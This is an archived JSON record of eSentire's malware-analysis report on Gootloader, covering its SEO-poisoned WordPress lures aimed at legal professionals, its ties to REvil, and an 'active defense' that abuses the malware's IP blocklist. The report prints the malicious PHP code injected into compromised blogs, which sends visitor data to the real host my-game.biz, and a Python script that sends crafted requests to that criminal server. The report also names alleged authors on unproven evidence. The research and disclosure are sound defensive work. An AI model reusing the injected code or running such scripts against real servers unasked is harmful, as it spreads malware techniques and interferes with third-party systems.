{
    "id": "bd202cb3-158c-430e-a159-0c783933eb8a",
    "created_at": "2023-05-06T02:08:52.114681Z",
    "updated_at": "2025-03-27T02:09:17.998219Z",
    "deleted_at": null,
    "sha1_hash": "a304b1e08a1d66507010adb26c6795e8bfe22ee7",
    "title": "2023-04-26 - Gootloader Unloaded- Researchers Launch Multi-Pronged Offensive Against Gootloader, Cutting Off Traffic to Thousands of Gootloader Web Pages and Using the Operator’s Very Own Tactics to Protect End-Users",
    "authors": "",
    "file_creation_date": "2023-05-05T02:07:08Z",
    "file_modification_date": "2023-05-05T02:07:08Z",
    "file_size": 7766346,
    "plain_text": "# Gootloader Unloaded: Researchers Launch Multi- Pronged…\n\n**esentire.com/web-native-pages/gootloader-unloaded**\n\nResources\n\nTRU INTELLIGENCE CENTER\n\nOur Threat Response Unit (TRU) publishes security advisories, blogs, reports, industry\npublications and webinars based on its original research and the insights driven through\nproactive threat hunts.\n\n[View Threat Intelligence Resources →](https://www.esentire.com/resources/tru-intelligence-center)\nCompany\n\nABOUT ESENTIRE\n\nAbout Us\n\neSentire is The Authority in Managed Detection and Response Services, protecting the\ncritical data and applications of 2000+ organizations in 80+ countries from known and\nunknown cyber threats. Founded in 2001, the company’s mission is to hunt, investigate and\nstop cyber threats before they become business disrupting events.\n\n[Read about how we got here](https://www.esentire.com/company/about-us)\n[Leadership](https://www.esentire.com/company/leadership) [Work at eSentire](https://www.esentire.com/company/careers)\nEVENT CALENDAR\n\nMay\n\n01\n\nChannel Partners Conference & Expo\n\neSentire will be attending the Channel Partners Conference & Expo.\n\nMay\n\n09\n\nMay TRU Intelligence Briefing\n\nJoin us for this month's TRU Intelligence Briefing\n\n\n-----\n\nMay\n\n11\n\nArizona Technology Council 2023 Cybersecurity Summit\n\neSentire will be attending the 2023 Cybersecurity Summit.\n\n[View Event Calendar →](https://www.esentire.com/company/event-calendar)\nPartners\n\nPARTNER PROGRAM\n\ne3 Ecosystem\n\nWe provide sophisticated cybersecurity solutions for Managed Security Service Providers\n(MSSPs), Managed Service Providers (MSPs), and Value-Added Resellers (VARs). Find out\nwhy you should partner with eSentire, the Authority in Managed Detection and Response,\ntoday.\n\n[Learn more](https://www.esentire.com/partners)\nSearch\n\neSentire Encourages Security Defenders to Follow their Lead\n\n## Executive Summary\n\neSentire’s [Threat Response Unit (TRU), led by researchers Joe Stewart and Keegan](https://www.esentire.com/resources/tru-intelligence-center)\nKeplinger, have launched a multi-pronged offensive against a growing cyberthreat: the\n**Gootloader Initial Access-as-a-Service Operation. The Gootloader Operation is an**\nexpansive cybercrime business, and it has been active since 2018. For the past 15 months,\nthe Gootloader Operator has been launching ongoing attacks targeting legal professionals\nworking for both law firms and corporate legal departments in the U.S., Canada, the U.K. and\n[Australia. Between January and March 2023, TRU shut down Gootloader attacks against 12](https://www.esentire.com/blog/hackers-attack-employees-from-six-law-firms-with-the-gootloader-and-socgholish-malware-using-fake-legal-agreements-and-malicious-watering-hole-s-reports-esentire)\ndifferent organizations, seven of which were law firms.\n\nWhile Gootloader might not be a household name like many ransomware threats, the\nGootloader Operation is compromising organizations across the globe and selling this\naccess to ransomware threat actors and other cybercriminals. Since Gootloader is a\n“Gateway to Hands-on Intrusions”, not just annoying, automated adware, hackers use it to\nget a foothold in an organization’s IT environment and then spread laterally through the\norganization’s network to seed out ransomware or to exfiltrate data.\n\n\n-----\n\nThe Gootloader Operation is targeting law firms and law professionals because that s where\nthey can find the most sensitive data that most people want to be kept confidential. It is the\nkind of data that can damage reputations, compromise business deals, expose protected\nwitnesses, and undermine an organization’s legal case. The Cybersecurity and Infrastructure\n[Security Agency (CISA) named it a top malware strain of 2021.](https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-216a)\n\nBy using Search Engine Optimization (SEO) poisoning to lure unsuspecting victims to an\nenormous array of compromised WordPress blogs, Gootloader tailors its victim pool to a\nsubset of organizations most likely to pay a handsome ransom. Currently, one of these\n“victim pools” is legal professionals working for law firms and corporate legal departments.\n\nGootloader infects legal employees by luring them to blogs, which are populated with content\npertaining to “legal agreements” and “contracts”. When the employee visits the blog, which\nincludes a link to what appears to be a sample “legal agreement” or “contract”, and they\ndownload the file, they are downloading Gootloader.\n\nOne of the most interesting aspects of Stewart and Keplinger’s research was that they were\nable to use the Gootloader page data to confirm the connection that other security\nresearchers had previously reported: that the Gootloader Operator(s) had been providing\nInitial Access victims to the notorious Russian-speaking REvil (aka: Sodinokibi) Gang. Not\nonly were Stewart and Keplinger able to confirm this connection, but they were also able to\nnarrow down the timelines of all the REvil-sponsored Gootloader campaigns to the day.\n\nStewart and Keplinger set out to figure out a way of shutting down the growing Gootloader\ninfections, and it turned out that the Gootloader malware operator, himself, has provided part\nof the answer. The Operator implemented a feature to keep his payloads from being\ndiscovered by security researchers and incident responders. Stewart and Keplinger\ndiscovered that they and other security defenders can use this same tactic to hide end-users\nfrom the Gootloader Operator, thus proactively protecting organizations from being infected.\n\nStewart also built a crawler for finding all the live Gootloader webpages, and eSentire is\nproviding technical details needed to identify these pages with search engine vendors with\nthe goal of blocking these malicious pages, thus preventing end-users from ever seeing\nthem. This is another way eSentire is proactively trying to protect corporate end-users from\nbeing infected with Gootloader. eSentire is sharing its methods at the RSA Security\nConference in San Francisco the week of April 24 and is encouraging other securityth\ndefenders to follow its lead.\n\n## Introduction\n\nThe [Gootloader Initial Access-as-a-Service operation is an expansive cybercrime business](https://www.esentire.com/blog/hackers-attack-employees-from-six-law-firms-with-the-gootloader-and-socgholish-malware-using-fake-legal-agreements-and-malicious-watering-hole-s-reports-esentire)\nand it has been active since 2018. For the past 15 months, the Gootloader Operator has\nbeen launching ongoing attacks targeting legal professionals working for both law firms and\n\n\n-----\n\ncorporate legal departments in the U.S., Canada, the U.K. and Australia. Between January\nand March 2023, TRU shut down Gootloader attacks against 12 different organizations,\nseven of which were law firms.\n\nGootloader might not have a household name like many ransomware threats, however, it is\nthe Gootloader Operation that is compromising organizations across the globe and selling\nthis access to ransomware threat actors and other cybercriminals.\n\nSince the Gootloader malware is used as a “Gateway to Hands-on Intrusions”, hackers\nuse it to get a foothold in an organization’s IT environment and then spread laterally through\nthe organization’s network to seed out ransomware or to exfiltrate data. Gootloader targets\nlaw firms and law professionals because that's where they can find the most sensitive data\nthat most people want kept confidential. It is the kind of data that can damage reputations,\ncompromise business deals, expose protected witnesses, and undermine an organization’s\n[legal case. The Cybersecurity and Infrastructure Security and Agency (CISA) named it a top](https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-216a)\nmalware strain of 2021.\n\n\n-----\n\n## REvil Ransomware Gang and the Gootloader Operator(s) – Partners in Crime\n\nOne of the most interesting aspects of Stewart and Keplinger’s research was that they were\nable to use the Gootloader page data to confirm the connection that other security\nresearchers had previously reported: that the Gootloader Operator(s) had been providing\nInitial Access victims to the notorious Russian-speaking REvil (aka: Sodinokibi) Gang. Not\nonly were Stewart and Keplinger able to confirm this connection, but they were also able to\nnarrow down the timelines of all the REvil-sponsored Gootloader campaigns to the day.\n\n\n-----\n\nREvil is infamous for launching some of the most destructive ransomware attacks worldwide.\nThey not only attacked private businesses, but they also went after corporations and\norganizations that are part of critical infrastructure sectors. These victims included JBS S.A.,\nthe world’s largest meat processing company. The attack temporarily shut down their\noperations in the U.S., Canada, and Australia. According to JBS USA CEO Andre Nogueira,\nthe company paid the REvil threat actors US $11 million in an attempt to “avoid any\nunforeseen issues and ensure no data was exfiltrated.”\n\nA second critical infrastructure organization and victim of REvil was Kaseya, a global\nprovider of unified IT & security management software for IT professionals working as\nmanaged service providers (MSPs) and mid-market enterprises (MMEs). MSPs use\nKaseya’s solutions to monitor the IT infrastructure for their end-user companies. Specifically,\nthe REvil attackers released a fake software update from Kaseya via an authentication\nbypass vulnerability, which then spread malware to Kaseya’s MSP customers and then on to\ntheir end-user customers. The Kaseya attack was a “supply chain ransomware attack”,\ngiving the REvil threat actors access to thousands of downstream companies via Kaseya’s\nnetwork of MSP customers.\n\nStewart and Keplinger have discovered that the Gootloader Operator(s) worked with REvil\nfrom 2019 through July 2022. What Stewart and Keplinger have uncovered is that during\ncertain timeframes, the REvil Gang launched ransomware campaigns against speakers of\nspecific languages (Figure 1).\n\nIt was the same language(s) that the Gootloader Operators targeted and during the same\ntime segments as when the REvil attacks occurred. For example, in 2019, Gootloader\nheavily targeted Korean speakers when looking for their Initial Access victims. It was also in\n2019 that the REvil Gang began infecting companies in South Korea with their ransomware,\nand they continued these attacks throughout 2019.\n\nFigure 1 - Languages targeted by Gootloader malware between 2019-2023\n\n\n-----\n\nLikewise, in 2020, TRU found evidence showing that the Gootloader Operator(s) began\nheavily targeting English and German speakers and continued focusing on these two victim\npools throughout 2021. Coincidently, the REvil Gang was seen attacking German-based\norganizations and organizations in the U.S., Canada, Australia, and the U.K. from 2020\nthrough 2021. From the beginning of 2022 and up until September 2022, both Gootloader\nand REvil continued targeting English speakers.\n\nCoincidentally, from 2022 to the present, Gootloader has focused largely on English\nspeakers looking for legal agreements. This specific targeting certainly provides\ncybercriminals, like REvil, with a pool of extremely high-value victims—law firm employees\nand employees of corporate legal departments.\n\nIn November 2021, the U.S. Department of the Treasury said the REvil Ransomware Gang\nhad received more than USD $200 million in extortion payments, and that their malware had\nbeen “deployed” against approximately 175,000 computers worldwide. Stewart and\nKeplinger believe, with high confidence, that the Gootloader Operator’s “act of continually\nfeeding victims” to the REvil Gang was absolutely integral to REvil’s success and their ability\nto extort USD $200 million from their victims. And because Gootloader continues to rack up\nvictims daily in the U.S., Canada, the U.K., and Australia, Stewart and Keplinger feel that it is\nvery possible the Gootloader Operator is working with another ransomware gang or\ncontinuing to work with members of the REvil Gang, who are simply operating under a\ndifferent group name.\n\n## Gootloader’s Modus Operandi\n\nBy using Search Engine Optimization (SEO) poisoning to lure unsuspecting victims to an\nenormous array of compromised WordPress blogs, Gootloader tailors its victim pool to a\nsubset of organizations most likely to pay a handsome ransom. One of these “victim pools”\nare legal professionals working for law firms and corporate legal departments.\n\nGootloader infects legal employees by luring them to blogs, which are populated with content\npertaining to “legal agreements” and “contracts.” The employee visits the blog, which\nincludes a link to what appears to be a sample “legal agreement” or “contract” and when they\ngo to download the file, they are downloading Gootloader (Figure 2).\n\nAs mentioned previously, legal professionals have been a primary target of the Gootloader\nOperator for the past 15 months, and between January and March 2023, TRU shut down\nGootloader attacks against 12 different organizations, seven of which were law firms.\n\n\n-----\n\nFigure 2 - Gootloader landing page from a compromised WordPress blog\n\n## Gootloader’s Origins\n\nThe name Gootloader emerged in 2020 to classify a specific component of the Gootkit\nmalware, largely because security researchers felt it was unique enough to be classified\nindependently of its primary payload. Gootkit is a much older trojan that first emerged in\n2010 (contrary to several published analyses, dating it to 2014).\n\nGootkit was a sophisticated banking trojan that targeted financial institutions in Europe,\nspecifically Germany, Austria, and Switzerland. The trojan was distributed via phishing\nemails and malicious websites and it had the ability to steal sensitive financial information,\nincluding bank login credentials and credit card data.\n\nGootloader was designed to deliver a range of other types of malware to infect systems,\nincluding ransomware, banking trojans, and spyware Gootkit is alleged to be authored by\n**a Russian developer known as “MZђ”.**\n\n## Gootkit Creator Doxxed by the Author of the Infamous Gameover Zeus Banking Trojan, Evgeniy Bogachev?\n\n\n-----\n\nInterestingly, an administrator of the KernelMode forum known as EP_X0FF doxxed the\nGootkit author in a forum post, alleging that his real name was Denis Turin, a Russian\ndeveloper from Tomsk, Russia, later residing in St. Petersburg (Figure 3).\n\nFigure 3 - KernelMode post doxxing the Gootkit author\nEven more interesting is the fact that EP_X0FF himself has been alleged to be none other\n[than the author of the infamous Zeus trojan, Evgeniy Bogachev\n(Figure 4). Bogachev is also](https://www.fbi.gov/wanted/cyber/evgeniy-mikhailovich-bogachev)\nthe author of the popular banking trojan, Gameover Zeus. Security experts estimate that\nGameover Zeus is responsible for more than 1 million computer infections, resulting in\nfinancial losses of more than USD $100 million.\n\nOn May 19, 2014, Bogachev was indicted by a federal grand jury in the Western District of\nPennsylvania on charges of conspiracy, computer fraud, wire fraud, bank fraud, and money\nlaundering. The FBI has a USD $3 million reward for information leading to Bogachev’s\narrest.\n\nFigure 4 - Blog comment alleging EP_X0FF is the author of the Zeus Trojan\nNote: no evidence was provided by the commenter “Dimitri” who stated EP_X0FF is\nBogachev, and it has since been disputed by a security researcher at Kaspersky Lab.\n\n\n-----\n\neSentire s Threat Response Unit (TRU) has uncovered independent evidence linking a circa2010 Gootkit Command and Control Server (C2) to the same individual, alleged by\nEP_X0FF, to be the Gootkit author, as well as other pseudonyms such as “freeeez,”\n“UnW1n,” “ZuwizarD,” and “Patolog.”\n\nHowever, it is possible that the Gootkit/Gootloader code may have changed hands over the\nlast 13 years of its evolution, so it is unknown if this individual is still currently operating the\nGootloader service (Figure 5).\n\nFigure 5 - Evidence linking Gootkit to its alleged author\n\n## Gootloader’s Stealthy Tactics of Keeping Victims in the Dark\n\nGootloader manages to keep its pool of compromised WordPress blogs producing fresh\nvictims for years in most cases by using stealth tactics and only showing computer users the\nmalware-laden landing pages under certain circumstances.\n\nThe malicious payloads are never displayed to logged-in users of the WordPress site,\nmeaning that the site administrators usually have no idea that their blog is compromised and\nthat it is acting as part of the Gootloader malware network. The IP addresses of the\nadministrators (and several netblocks above and below their IP addresses) are also blocked,\npreventing them from viewing the malicious pages on a second visit, even if they are loggedout.\n\n\n-----\n\nThe blocklisting features of Gootloader are also incorporated into the Gootloader\n“mothership,” the server that delivers the malicious payloads to the compromised blog for\ndisplay to the end-user. Each visitor will only receive the payload once, then the IP is blocked\nby the mothership server for 24 hours – across all Gootloader-compromised blogs.\n\nThis tactic is effective at stymying security researchers or incident response teams to a\ncertain degree, at least until they hop on a VPN and try loading the malicious blog post\nagain. However, security teams can use this feature to their advantage in order to\n**proactively protect their end-users from Gootloader infections.**\n\n## Turning the Tables: Using Gootloader’s Blocklisting Feature to Protect End-Users\n\nEach time a non-blocked visitor loads a malicious post from a compromised Gootloader blog,\nspecific code is executed on the server, relaying information about the request to the\nGootloader mothership:\n```\n$request = @wp_remote_retrieve_body(@wp_remote_get(\n\n      \"http://my-game.biz/index.php?a=\" . base64_encode($_GET[$qwc4]) . '&b=' .\nbase64_encode($_SERVER[\"REMOTE_ADDR\"]) . '&c=' .\nbase64_encode($_SERVER[\"HTTP_USER_AGENT\"]) . '&d=' . base64_encode(wp_get_referer()),\n\n      array(\"timeout\" => 120)\n\n    )\n\n    );\n\n\n```\nThe variables sent in this request are:\n\nA number representing the specific document being viewed by the end-user (likely\nrelayed as a way for the Gootloader author to keep track of which SEO terms are the\nmost effective)\nThe IP address of the visiting user (for Geofencing by country and for blocking\nsubsequent requests for one full day)\nThe browser user-agent string (for use in targeting specific platforms only)\nThe HTTP referrer if any\n\nThe Gootloader mothership relies on the compromised blog to tell it the IP address of the\nvisiting user, which it has no way of knowing directly. Therefore, it is possible to blocklist any\nIPv4 address on the Internet from seeing any malicious Gootloader landing page on the\nInternet for 24 hours by specially crafting a request to the Gootloader mothership and\ncarefully emulating the above request.\n\n## Active Defense\n\n\n-----\n\nPython code can be used to emulate the PHP traffic from the compromised blog to the\nGootloader mothership, retrieving the malicious payload and getting any desired IPv4\naddress added to the blocklist.\n```\n#!/usr/bin/env python3\n\nfrom collections import OrderedDict\n\nfrom base64 import b64encode\n\nimport requests\n\nimport sys\n\n\nif len(sys.argv) != 5:\n\n  print(f\"Usage: {sys.argv[0]} <compromised blog domain> <WordPress version>\n<article ID> <IP to get blocklisted>\")\n\n  print(f\"Example: {sys.argv[0]} jonas.fi 5.8.6 2268444 1.1.1.1\")\n\n  sys.exit(1)\n\nurl = 'http://my-game.biz/index.php' # Gootloader mothership\n\ndomain = sys.argv[1]\n\nwp_version = sys.argv[2]\n\narticle = b64encode(sys.argv[3].encode()).decode()\n\nIP = b64encode(sys.argv[4].encode()).decode()\n\nc = b64encode(b'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like\nGecko) Chrome/110.0.0.0 Safari/537.36').decode()\n\nd = '' # referrer, not always present\n\nreq = f\"{url}?a={article}&b={IP}&c={c}&d=\"\n\nheaders = OrderedDict([\n\n  ('User-Agent', f\"WordPress/{wp_version}; https://{domain}\"),\n\n  ('Accept', '*/*'),\n\n  ('Accept-Encoding', 'identity'),\n\n  ('Referer', req)\n\n])\n\nprint(f\"Sending: {req}\")\n\nresponse = requests.get(req, headers=headers)\n\nprint(response.content)\n\n\n```\nThe first request made should output the base64-encoded obfuscated Gootloader landingpage payload. A second request made within 12 hours using the same parameters should\nreturn an empty response – this indicates the IP sent in the request was added to the\nGootloader blocklist.\n\n## Other Active Defense Vectors\n\nThere are additional layers to Gootloader’s blocklist. While we do not have the source code\nto the Gootloader mothership, we have observed that in certain cases, Gootloader will not\nonly block the reported IP, but an entire range of netblocks above and below that IP address,\n\n\n-----\n\nover 5000 IP addresses in total.\n\nTheoretically, if we can get any chosen IP address added to this more restrictive blocklist, it\nwould only take just over 800,000 requests to the Gootloader mothership every 24 hours to\neffectively inoculate 100% of Gootloader’s potential victim pool by blocking the entire global\nIPv4 network space by choosing IP addresses at appropriate numeric intervals.\n\nAnother layer is abusing the blocklist that is part of the code injected into the compromised\nWordPress blogs. This blocklist only impacts logged-in users, so it would not be applicable to\nall the Gootloader landing pages, however, some subset of the compromised sites have user\nregistration enabled or use third-party OAUTH logins. Visiting one of the landing pages on\nsuch a site, from carefully chosen proxy IP addresses, could allow defenders to block a large\nswath of the Internet from being infected by the site, and in this case, the blocklist is\npermanent.\n\neSentire is actively using the defense methods described above to protect its customers.\nSince implementing these measures, eSentire has not observed any occurrences where our\n[MDR for Network customers have downloaded Gootloader. eSentire is also partnering](https://www.esentire.com/how-we-do-it/signals/network)\nacross its ecosystem and collaborating with technology alliance partners to ensure\nwidespread communication and adoption of these recommendations.\n\n## Cutting Off Traffic to Thousands of Gootloader Web Pages\n\nAs mentioned previously, since 2020 the Gootloader Operator has used Search Engine\nOptimization (SEO) poisoning to lure unsuspecting victims to thousands of compromised\nWordPress blogs. Many of these blogs contain hundreds of malicious web pages which lead\nto Gootloader malware.\n\nStewart has located 375,000 malicious URLs across thousands of blogs that have been\nhijacked by Gootloader. End-users, especially legal professionals, are lured to the blog\npages because they are populated with content pertaining to “legal agreements” and\n“contracts.” The employee visits the blog, goes to download a sample “legal agreement” or\n“contract” and they end up downloading Gootloader.\n\nStewart built a crawler for finding all the live Gootloader web pages, and eSentire is\nproviding technical details needed to identify these pages with top search engine vendors\nwith the goal of blocking these malicious pages, thus preventing end-users from ever seeing\nthem.\n\n## Beating Gootloader at its Own Game – Taking a Bite Out of the Malware Supply Chain\n\n\n-----\n\nNo doubt the Gootloader author will read this paper and consider the ramifications to his\noperation, especially if the techniques described are adopted by other MSSPs and security\norganizations.\n\nAs security researchers, we are continually faced with the same dilemma when publishing\ncountermeasures against malware services – is it better to keep the information secret and\nhope the malware operator does not evolve tactics? Or do we share it with the world in\nhopes of protecting as many people as possible and raising awareness about the scope of\nthe threat?\n\nSince we have decided to publish the details of the countermeasure, the malware author\nnow has a decision to make. First, he needs to consider whether he can detect our injected\nblocklist Ips from a wide range of sources and/or does he remove or modify the global\nblocklisting feature?\n\nAt some point, it becomes an escalating game of cat-and-mouse. Whitehats can employ\ngreater resources to evade the available detection measures he may deploy, so ultimately\nthe Gootloader author may need to eliminate the blocklist or greatly shorten its duration.\n\nEither way, this will be a net win for safety and security, as researchers will more easily be\nable to detect and report the malicious landing pages to the impacted WordPress blog\nadministrators and anti-phishing and browser blocklists, which will ultimately impact\nGootloader and its ransomware customers’ bottom line.\n\n## Keep Watch for Gootloader’s Indicators of Compromise (IOCs) and Modus Operandi (MO)\n\n“It is critical for companies’ security teams to quickly identify and remediate Gootloader\ninfections within their environment to prevent follow-on attacks and the deployment of more\ndamaging malware such as ransomware or Cobalt Strike,” said Keplinger. “Being aware of\nthe hacker group’s typical MO, for example, infection process and their IOCs, are key to\nidentifying and shutting down a Gootloader attack.”\n\n## Gootloader’s Typical Infection Process\n\nUser performs a web search for a document or document template\nUser clicks on search result leading to Gootloader landing page\nLanding page presents a fake web forum and link to the requested document\nUser clicks on the presented link, and receives a Zip archive\nUser opens the archive, finds a JavaScript file (.js extension) disguised as the\nrequested document\nUser executes the JavaScript file by double-clicking it\n\n\n-----\n\nWindows executes the JavaScript file using the Windows script host process, resulting\nin the execution of the Gootloader malware\n\n[A repository of URLs for current LIVE Gootloader web pages can be found here.](https://github.com/esThreatIntelligence/GootLoader)\n\neSentire would like to thank the author of the GootloaderSites feed for his assistance with\nthis research. For more information on Gootloader IOCs, follow his blog at\n[https://gootloader.wordpress.com/ and subscribe to his feed on Mastodon at](https://gootloader.wordpress.com/)\n[https://ioc.exchange/@GootloaderSites.](https://ioc.exchange/@GootloaderSites)\n\n## Defending Your Company and Employees Against Gootloader\n\nThe Gootloader hackers ensnare their victims because they fool them into downloading\ndocuments from the Web. Therefore, one of the most important defenses companies\ncan implement against Gootloader is security awareness training for their employees.\nCompanies must educate employees regarding the risk of Gootloader, and more\nbroadly, the security risks involved with using search engines to find and download free\ndocument templates.\nEmployees need to make sure they can trust document sources. Even legitimate Word\nand Excel documents from the Internet can lead to malware.\nBe wary of Word and Excel documents sent from an unknown source or acquired from\nthe Internet that prompts you to ‘Enable Macros’.\nEmployees need to ensure that the content downloaded is content they intended to\ndownload. If one downloads a document from the Internet but they are served a\nJavaScript file, one should not open it. It should be escalated to one’s internal IT\nsecurity team.\nEnsure standard procedures are in place for employees to submit potentially malicious\ncontent for review.\nUse Windows Attack Surface Reduction rules to block JavaScript and VBScript from\nlaunching downloaded content.\nEmploy an Endpoint Detection and Response (EDR) solution.\nEngage 24/7 threat detection, investigation, and response for continuous security\nmonitoring, complete visibility across the attack surface, and access to highly certified\nsecurity experts.\n\n[If you’re not currently engaged with a Managed Detection and Response provider, we highly](https://www.esentire.com/what-we-do/esentire-managed-detection-and-response)\nrecommend you partner with eSentire MDR to build resilience and disrupt threats before they\nimpact your business.\n\n[Want to learn more about how we protect legal firms globally? Connect with an eSentire](https://www.esentire.com/get-started)\nSecurity Specialist.\n\n### Skip To:\n\n\n-----\n\nREvil Ransomware Gang and the Gootloader Operator(s) – Partners in Crime\nGootloader’s Modus Operandi\nGootloader’s Origins\nGootloader’s Stealthy Tactics of Keeping Victims in the Dark\nTurning the Tables: Using Gootloader’s Blocklisting Feature to Protect End-Users\nActive Defense\nCutting Off Traffic to Thousands of Gootloader Web Pages\nBeating Gootloader at its Own Game – Taking a Bite Out of the Malware Supply Chain\nGootloader’s Typical Infection Process\nDefending Your Company and Employees Against Gootloader\n\n### Ready to get started?\n\nConnect with an eSentire Security Specialist to learn how we can help you build a more\nresilient security operation and prevent disruption.\n\n[Get Started](https://www.esentire.com/get-started)\nCookies allow us to deliver the best possible experience for you on our website - by\ncontinuing to use our website or by closing this box, you are consenting to our use of\n[cookies. Visit our Privacy Policy to learn more.](https://www.esentire.com/legal/privacy-policy)\n\nAccept\n\n**The Authority in Managed Detection and Response.**\n\n2023 eSentire, Inc. All Rights Reserved.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2023/2023-04-26 - Gootloader Unloaded- Researchers Launch Multi-Pronged Offensive Against Gootloader, Cutting Off Traffic to Thousands of Gootloader Web Pages and Using the Operator’s Very Own Tactics to Protect End-Users.pdf"
    ],
    "report_names": [
        "2023-04-26 - Gootloader Unloaded- Researchers Launch Multi-Pronged Offensive Against Gootloader, Cutting Off Traffic to Thousands of Gootloader Web Pages and Using the Operator’s Very Own Tactics to Protect End-Users.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1683338932,
    "ts_updated_at": 1743041357,
    "ts_creation_date": 1683252428,
    "ts_modification_date": 1683252428,
    "files": {
        "pdf": "https://archive.orkl.eu/a304b1e08a1d66507010adb26c6795e8bfe22ee7.pdf",
        "text": "https://archive.orkl.eu/a304b1e08a1d66507010adb26c6795e8bfe22ee7.txt",
        "img": "https://archive.orkl.eu/a304b1e08a1d66507010adb26c6795e8bfe22ee7.jpg"
    }
}